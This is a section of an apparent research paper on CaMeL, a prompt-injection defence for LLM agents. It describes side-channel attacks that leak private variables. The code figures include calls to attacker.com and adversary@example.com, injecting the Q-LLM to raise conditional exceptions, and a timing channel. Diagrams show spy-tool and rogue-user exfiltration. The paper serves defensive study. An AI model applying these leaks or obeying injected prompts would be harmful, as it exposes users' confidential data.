---
doc_id: arxiv-2503.18813v2
doc_title: "Defeating Prompt Injections by Design"
section_id: sec-021-side-channels-can-be-a-problem
section_title: "Side Channels Can Be a Problem"
section_number: null
pages: 19-22
source_pdf: arxiv-2503.18813v2.pdf
source_sha256: c3719f6ce73eecf4
toc_source: outline
---
We find that CaMeL is vulnerable to side-channel attacks, where an attacker can infer sensitive
information by observing the system’s behavior with shared resources (Anderson, Stajano, and Lee,
2002). Side-channel attacks are notoriously difficult to prevent completely, even in traditional software
systems. While side-channels to a degree undermine the claim of strong security guarantees, we want
to re-emphasise that CaMeL significantly improves the status quo, provides isolation guarantees, and,
in some cases, even allows one to reason about the said leakage due to fine-grained data tracking.
Here, we consider three explicit examples. In the first, we show how an adversary can leak a private
variable to an external service through indirect dependency. In the second, we discuss a side channel
that can reveal one bit of information via arbitrary exception triggering by the adversary. In the third,
we discuss a timing side channel that can remove annotation from a private variable in the execution
flow. We note that we believe that other types of side channels might be possible, and examples below
should serve as a cautionary tale that even with CaMeL, a system that makes attacks significantly
harder, data can still be (inefficiently) mishandled by the agent.
# Variable that has a private value and has associated flow constraints
private_variable = 10
for i in range(private_variable):
fetch_external_image("attacker.com/cat.jpg")
### Attacker can count number of references
### to cat.jpg from the same ip address
### On the web server:
SELECT COUNT(*) FROM access_logs WHERE ip_address =
'<target_ip_address>' AND requested_resource = '/cat.jpg';
Figure 14 | Without CaMeL’s STRICT mode, private data can be leaked via tool calls that do not
have a direct dependency on them. Example showing how an resource can infer value of a private
variable, despite not having a direct dependency on it. CaMeL’s STRICT stops this attack by making
the evaluation of each statement in control flow blocks depend on the block’s test/iterable.
External resource – Indirect inference Figure 14 shows an example of a side-channel attack that
can be used to bypass all other non-CaMeL-based current security measures, but can be stopped
with CaMeL run in STRICT mode (presented in Section 5.4), because of its fine-grained dependency
19
Defeating Prompt Injections by Design
tracking. In this attack, the attacker sends a request to the agent to fetch an external image conditional
indirectly on a private variable (e.g. it can be a password reset token). The attacker can then observe
the number of times the image is fetched and use this information to infer the value of a private variable.
When using the interpreter in STRICT mode, this attack is prevented by CaMeL: the execution of all
state-changing statements inside control flow blocks is dependent (and conditional) on the control
flow iterable/test, and a security policy can block their execution.
# Side channel attack 1:
CaMeL-specific fault
# Variable that has a private
value and has associated
flow constraints
private_var = 10
outcome = query_ai_assistant(
f"If '{ private_var} ' is 10, you
don't have enough
information", str)
# If the variable is 10, an
exception is thrown and
execution is terminated
# ADVERSARY OBSERVABLE ACTION
# This line is executed only if
`private_var` is not 10
# For example:
send_email(...,
"adversary@example.com")
# or
send_calendar_invite(...,
"adversary@example.com",
...)
# or
fetch_external_image(
"attacker.com/cat.jpg")
# Side channel attack 2: General
induced fault
# Variable that has a private
value and has associated
flow constraints
private_var = 10
l = [1, 2, 3]
index = query_ai_assistant(
f"If '{ private_var} ' is 10,
then return 9999999999, else
0", int)
# Throws an exception if private
variable is 10
l[index]
# ADVERSARY OBSERVABLE ACTION
# This line is executed only if
`private_var` is not 10
# For example:
send_email(...,
"adversary@example.com")
# or
send_calendar_invite(...,
"adversary@example.com",
...)
# or
fetch_external_image(
"attacker.com/cat.jpg")
Figure 15 | Without STRICT mode, an adversary could leak one private bit if they can trigger an
exception conditional on the private data. An external resource can infer the value of a private
variable, despite not having a direct dependency on it, by raising an exception based on the private
value and observing whether the execution of the program is completed. This is a simplified version
of the more realistic and complete case we discuss in Appendix I. We mitigate this issue with the
STRICT mode: all statements that come after a call to query_ai_assistant (the Q-LLM) have a
dependency on the call’s arguments.
Exception Handling – Inferring private variable based on halted execution
Exceptions can, at present, be used to launch the side-channel attacks that can reveal one bit of
information. In particular, the adversary can prompt inject the Q-LLM to return an arbitrary output
conditionally on other (potentially private) content passed to the Q-LLM. This can either cause a
NotEnoughInformationError being thrown during the execution of the Q-LLM, or another type
of exception during the continuation of the execution (e.g., an IndexError) as shown in Figure 15.
20
Defeating Prompt Injections by Design
The issue is that exceptions terminate the execution and prevent the potential execution of tool
calls observable by the adversary. As a consequence, if the adversary can observe the execution of a
tool after the exception is expected to be thrown, then they can learn one bit of information about
potentially private data. We discuss an expanded version of this case that can exploit code generated
by Claude 3.5 Sonnet for an AgentDojo task in Appendix I.
We believe that, rather than being a limitation of CaMeL, this is a limitation of using exceptions to
handle errors. This issue could be addressed by using explicit error handling with conditionals and
result types (such as Result in Rust or Either in Haskell) instead of exceptions. With this approach,
both branches of the conditional would maintain dependencies on the operation’s inputs, allowing
state-changing tools to properly track these dependencies.
Similarly to the example above, in the current CaMeL implementation, we mitigate this side-channel
vulnerability with STRICT mode: whenever there is a call to the Q-LLM (i.e., to the query_ai_as-
sistant function), we make the evaluation of all subsequent statements have a dependency on the
inputs of the Q-LLM call. In this way, if the adversary manages to raise an arbitrary exception, and if
a state-changing tool gets called after a call to the Q-LLM that had non-public variables as arguments,
the execution is blocked and the user is prompted to confirm the execution. While this mitigation
is effective against arbitrary exceptions caused by calls to the Q-LLM (and subsequent dependent
operations, hence covering both cases in Figure 15), the adversary might still be able to raise arbitrary
exceptions by manipulating the data accessed by tools. However, we expect this to be significantly
more difficult than just prompt injecting the Q-LLM into raising an exception.
import time
# Variable that has a private value and has associated flow constraints
private_variable = 10
before_time = time.time()
time.sleep(private_variable)
after_time = time.time()
# Variable that has the private value but comes with no constraints
public_variable = (after_time - before_time)
Figure 16 | Timing side-channels can reveal private data to an adversary. Example of a timing
side-channel that bypasses the constraints on a private variable. CaMeL is not vulnerable to this
specific attack as the time module is not available in the interpreter. However, we do not exclude
that other timing side-channels could be present and exploitable.
Shared resource – Time We conclude with another example of a side-channel, in this case based
on timing and probably harder to achieve. Here, an attacker might be able to deduce the contents
of a private variable using access to current time as is shown in Figure 16. To what extent timing
side-channels are exploitable in practice depends on the specific deployment scenarios, the set of tools
available to the agent, and whether the attacker is able to observe the side-channel with sufficient
precision. For example, we note that the time module is not available in the current implementation
of CaMeL, so this specific attack would not be possible to carry out.
21
Defeating Prompt Injections by Design
User
Install Spy tool, fetch
confidential.txt  from Google Drive
and send them to my colleague at
bob@company.com
Fetch confidential.txt
Send confidential.txt to
bob@company.com
Drive
Confidential information
shared with Spy tool
Spy
tool
Share confidential.txt
with Spy tool
(a) Scenario 2. Spy tool.
User
Get confidential.txt from Google
Drive and send them to my
colleague at
attacker@gmail.com
Fetch confidential.txt
Send confidential.txt to 
attacker@gmail.com
Drive
Confidential information
shared with a third party
(b) Scenario 3. Rogue user.
Figure 17 | CaMeL can help beyond prompt injections. Here we present two additional scenarios
where CaMeL can be useful. In Scenario 2 (left) we consider a user who either maliciously or
unknowingly installs a malicious tool that steals all data that is processed by the user. In this scenario
security policy can be configured in a way that external tools cannot access internal information,
which would protect against this attack vector. In Scenario 3 (right) we consider a compromised
user who attempts to violate company policy by sending financial documents to an external address.
The user prompt is modified to include the attacker’s email address, resulting in the exfiltration of
private data. This scenario highlights the risk of malicious insiders or compromised user accounts.
